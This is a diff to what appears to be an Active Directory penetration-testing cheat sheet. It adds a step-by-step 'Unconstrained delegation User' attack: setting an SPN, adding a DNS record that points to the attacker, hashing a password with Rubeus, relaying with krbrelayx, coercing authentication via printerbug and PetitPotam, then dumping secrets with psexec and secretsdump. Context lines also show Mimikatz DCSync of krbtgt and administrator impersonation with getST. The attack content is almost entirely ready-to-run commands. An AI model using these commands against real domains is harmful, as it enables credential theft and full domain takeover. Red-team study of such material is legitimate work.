@@ -28,9 +28,13 @@
     * [NTLMRelay](#NTLMRelay)
     * [GPO Abuse](#GPO-Abuse)
 * [Delegation](#Delegation) 
-  * [Unconstrained Delegation](#Unconstrained-delegation) 
-    * [Printer Bug](#Printer-bug) 
+  * [Unconstrained Delegation](#Unconstrained-delegation)
+    * [Unconstrained delegation computer](#Unconstrained-delegation-computer)
+    * [Printer Bug](#Printer-bug)
+    * [Unconstrained delegation User](#Unconstrained-delegation-User)
   * [Constrained Delegation](#Constrained-delegation) 
+    * [Constrained delegation User](#Constrained-delegation-User)
+    * [Constrained delegation Computer](#Constrained-delegation-Computer)
   * [Resource Based Constrained Delegation](#Resource-Based-Constrained-Delegation)
     * [Webclient Attack](#Webclient-Attack)
     * [Computer object takeover](#Computer-object-Takeover) 
@@ -697,10 +701,6 @@ Get-DomainComputer -UnConstrained
 Get-DomainComputer -UnConstrained | select samaccountname
 ```
 
-```
-.\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
-```
-
 ### Unconstrained delegation computer
 #### Check if any DA tokens are available on the unconstrained machine
 - Wait for a domain admin to login while checking for tokens
@@ -786,9 +786,62 @@ ls \\<DC>\pipe\spoolss
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
 
+### Unconstrained delegation User
+- Requires a user with unconstrained delegation and a SPN set which points to the attacker (or attacker controlled machine).
+	- A user with unconstrained delegation 
+	- User should have a SPN which doesn't point to a valid dns record - or it needs to point to a machine under your control - or able to set spn & create DNS record
+- https://exploit.ph/user-constrained-delegation.html
+
+#### Check User attributes
+```
+Get-Domainuser <USER> | select-object samaccountname, serviceprincipalname, useraccountcontrol
+```
+
+#### Set SPN for user
+```
+Set-DomainObject -Identity <USER> -Set @{serviceprincipalname='cifs/<HOSTNAME>.<DOMAIN>'}
+```
+
+#### Create a DNS record pointing to the attacker's machine IP
+-   https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
+-   https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
+```
+dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>
+
+Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> -Realm <DOMAIN>
+```
+
+#### Calculate RC4 hash for the user
+```
+./Rubeus.exe hash /password:<PASSWORD> /user:<USER> /domain:<DOMAIN>
+```
+
+#### Setup krbrelayx
+- Will save the ticket to disk after executing printerbug
+- https://github.com/dirkjanm/krbrelayx
+```
+sudo python3 /opt/windows/krbrelayx/krbrelayx.py -hashes :<HASH>
+```
+
+#### Trigger target to authenticate to attacker machine
+- Use hostname we created in the DNS record
+- https://github.com/topotam/PetitPotam
+```
+python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME>.<DOMAIN>
+
+python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME>.<DOMAIN> <TARGET>
+```
+
+#### Use TGT ticket and exploit
+```
+export KRB5CCNAME=<FILE>.ccache
+python3 Psexec.py -k -no-pass <TARGET FQDN>
+python3 Secretsdump.py -k <TARGET FQDN>
+```
+
 ### Constrained Delegation
 - To execute attack owning the user or server with constrained delegation is required.
-- 
+
 #### Enumerate users with contrained delegation enabled
 ```
 Get-DomainUser -TrustedToAuth
@@ -1134,7 +1187,7 @@ change-lockscreen -webdav \\webdav@8080\
 #### Impersonate any user
 ```
 getST.py <DOMAIN>/FAKE01@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
-Export KRB5CCNAME=administrator.ccache
+export KRB5CCNAME=administrator.ccache
 Psexec.py -k -no-pass <TARGET FQDN>
 ```
 
